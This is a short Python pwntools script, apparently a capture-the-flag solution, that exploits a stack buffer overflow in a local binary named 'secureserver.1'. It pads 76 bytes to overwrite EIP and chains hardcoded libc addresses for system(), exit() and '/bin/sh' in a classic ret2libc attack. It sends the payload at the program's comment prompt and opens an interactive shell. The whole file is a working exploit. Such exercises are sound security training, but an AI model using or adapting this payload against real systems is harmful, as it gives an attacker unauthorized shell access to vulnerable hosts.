from pwn import *

# Target binary
exe = './secureserver.1'
elf = context.binary = ELF(exe)
context.log_level = 'debug'

# Start the process
io = process(exe)

# Libc addresses
libc_base = 0xf7d74000
system = libc_base + 0x50050
bin_sh = libc_base + 0x19ce43
exit = libc_base + 0x41b90 

info('System: %#x', system)
info('bin_sh: %#x', bin_sh)

# Offset to EIP
padding = 76

# Build the payload
payload = flat(
    b'A' * padding,   # Overflow buffer to EIP
    p32(system),      # Address of system()
    p32(exit),         # Dummy return address
    p32(bin_sh)       # Address of "/bin/sh"
)

# Interact with the program to match its behavior
# Wait for the prompt "Please leave your comments for the server admin..."
io.sendlineafter(b"Please leave your comments for the server admin but DON'T try to steal our flag.txt:\n", payload)

# Interact with the shell after successful exploitation
io.interactive()

